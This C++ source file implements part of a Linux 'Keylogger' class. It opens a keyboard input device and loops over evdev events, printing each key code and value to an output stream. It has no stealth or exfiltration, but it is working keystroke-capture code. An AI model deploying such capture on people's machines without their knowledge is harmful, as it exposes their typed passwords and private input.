#include "api/keylogger.hpp"

#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

#include <cerrno>
#include <cstring>
// Open device helper: returns true and sets fd_ on success
bool Keylogger::open_device_() {
    if (device_path_.empty()) {
        last_error_ = "No keyboard device specified";
        return false;
    }

    fd_ = open(device_path_.c_str(), O_RDONLY);
    if (fd_ == -1) {
        last_error_ = "Failed to open device: " + std::string(strerror(errno));
        return false;
    }
    return true;
}


// Reader loop moved out of the lambda to simplify start()
void Keylogger::reader_loop_(std::ostream& output) {
    struct input_event ev;
    
    while (running_) {
        const ssize_t n = ::read(fd_, &ev, sizeof(ev));

        if (n != static_cast<ssize_t>(sizeof(ev))) {
            // Continue on interrupt
            if (n == -1 && errno == EINTR) 
                continue;
            
            last_error_ = "Error reading from device: " + std::string(strerror(errno));
            running_ = false;
            break;
        }
        
        if (ev.type == EV_KEY) {
            output << "KEY code=" << ev.code << " value=" << ev.value << std::endl;
            output.flush();
        }
    }
}
